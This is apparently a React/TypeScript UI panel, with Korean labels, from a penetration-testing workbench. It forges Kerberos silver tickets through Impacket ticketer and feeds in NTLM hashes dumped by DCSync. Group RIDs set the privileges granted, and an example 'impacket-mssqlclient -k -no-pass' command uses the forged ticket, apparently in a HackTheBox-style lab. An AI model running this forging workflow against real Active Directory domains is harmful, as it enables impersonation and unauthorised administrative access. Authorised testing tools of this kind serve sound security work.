import { useState } from "react";
import { parseSecretsdumpHashes } from "./serviceIntel";

export type SilverTicketExecution = {
  id: number; template_id: string; status: string;
  stdout?: string; stderr?: string;
};
export type SilverTicketRunState = {
  id?: number; templateId: string; status: string; stdout?: string; stderr?: string;
};

// Forging a silver ticket needs a service account's NTLM hash (often
// cracked from an NetNTLMv2 capture, or dumped via DCSync — see the
// "이 해시 사용" shortcut below), the domain SID, a target SPN, and the
// group RIDs to grant. None of that is nmap-derived, so — like AS-REP
// Roasting and password spray — this lives in its own panel with a direct
// run() call. impacket-ticketer writes <target_username>.ccache into this
// execution's own working directory and confirms it on stdout, so unlike
// AS-REP Roasting there's no separate output file to poll for.
export default function SilverTicketPanel({
  target, runState, serviceExecutions, evidenceMsg, dcsyncStdout,
  onForge, onCaptureEvidence,
}: {
  target?: { ip: string };
  runState?: SilverTicketRunState;
  serviceExecutions: SilverTicketExecution[];
  evidenceMsg: string;
  dcsyncStdout?: string;
  onForge: (fields: {
    nthash: string; domain: string; domainSid: string;
    spn: string; groups: string; targetUsername: string;
  }) => void;
  onCaptureEvidence: (
    execution: { id: number; stdout?: string; stderr?: string }, title: string,
  ) => void;
}) {
  const [nthash, setNthash] = useState("");
  const [domain, setDomain] = useState("");
  const [domainSid, setDomainSid] = useState("");
  const [spn, setSpn] = useState("");
  const [groups, setGroups] = useState("");
  const [targetUsername, setTargetUsername] = useState("Administrator");

  const ticketRunState = runState?.templateId === "ad-silver-ticket-ticketer" ? runState : undefined;
  const latestTicket = serviceExecutions
    .filter((item) => item.template_id === "ad-silver-ticket-ticketer" && item.status === "completed")
    .sort((a, b) => b.id - a.id)[0];
  const busy = !!ticketRunState && ["starting", "running"].includes(ticketRunState.status);
  const activeExecution = ticketRunState?.id
    ? { id: ticketRunState.id, stdout: ticketRunState.stdout, stderr: ticketRunState.stderr }
    : latestTicket
      ? { id: latestTicket.id, stdout: latestTicket.stdout, stderr: latestTicket.stderr }
      : undefined;
  const dumpedHashes = parseSecretsdumpHashes(dcsyncStdout || "");
  const ready = nthash.trim() && domain.trim() && domainSid.trim()
    && spn.trim() && groups.trim() && targetUsername.trim();
  const savedCcache = activeExecution?.stdout?.match(/Saving ticket in (\S+\.ccache)/)?.[1];

  return (
    <section className="netexecCredCheck" aria-labelledby="silver-ticket-heading">
      <header>
        <h2 id="silver-ticket-heading">Silver Ticket 위조 (Impacket ticketer.py)</h2>
      </header>
      {dumpedHashes.length > 0 && (
        <div className="netexecPwnedActions">
          {dumpedHashes.map((item) => (
            <button key={item.username} type="button" onClick={() => setNthash(item.nthash)}>
              {item.username} 해시 사용
            </button>
          ))}
        </div>
      )}
      <div className="netexecCredForm netexecCredForm--save">
        <input value={nthash} onChange={(e) => setNthash(e.target.value)}
          placeholder="NTLM 해시 (nthash)" aria-label="NTLM 해시" />
        <input value={domain} onChange={(e) => setDomain(e.target.value)}
          placeholder="도메인 (예: signed.htb)" aria-label="도메인" />
        <input value={domainSid} onChange={(e) => setDomainSid(e.target.value)}
          placeholder="도메인 SID (예: S-1-5-21-...)" aria-label="도메인 SID" />
        <input value={spn} onChange={(e) => setSpn(e.target.value)}
          placeholder="SPN (예: MSSQLSvc/dc01.domain:1433)" aria-label="SPN" />
        <input value={groups} onChange={(e) => setGroups(e.target.value)}
          placeholder="부여할 그룹 RID (쉼표로 구분, 예: 512,1105)" aria-label="그룹 RID" />
        <input value={targetUsername} onChange={(e) => setTargetUsername(e.target.value)}
          placeholder="위장할 사용자명" aria-label="위장할 사용자명" />
        <button disabled={busy || !ready} onClick={() => onForge({
          nthash: nthash.trim(), domain: domain.trim(), domainSid: domainSid.trim(),
          spn: spn.trim(), groups: groups.trim(), targetUsername: targetUsername.trim(),
        })}>
          {busy ? "위조 중…" : "Silver Ticket 위조"}
        </button>
      </div>
      {activeExecution && (
        <div className="intruderResults">
          <pre>{activeExecution.stdout}</pre>
          {savedCcache && (
            <p>티켓 저장됨: <code>{savedCcache}</code> — 예:
              <code>KRB5CCNAME={savedCcache} impacket-mssqlclient -k -no-pass {target?.ip}</code></p>
          )}
          <button onClick={() => onCaptureEvidence(
            activeExecution, `Silver Ticket · ${targetUsername || "unknown"}@${target?.ip}`,
          )}>Evidence로 저장</button>
          {evidenceMsg && <p className="netexecEvidenceMsg">{evidenceMsg}</p>}
        </div>
      )}
    </section>
  );
}
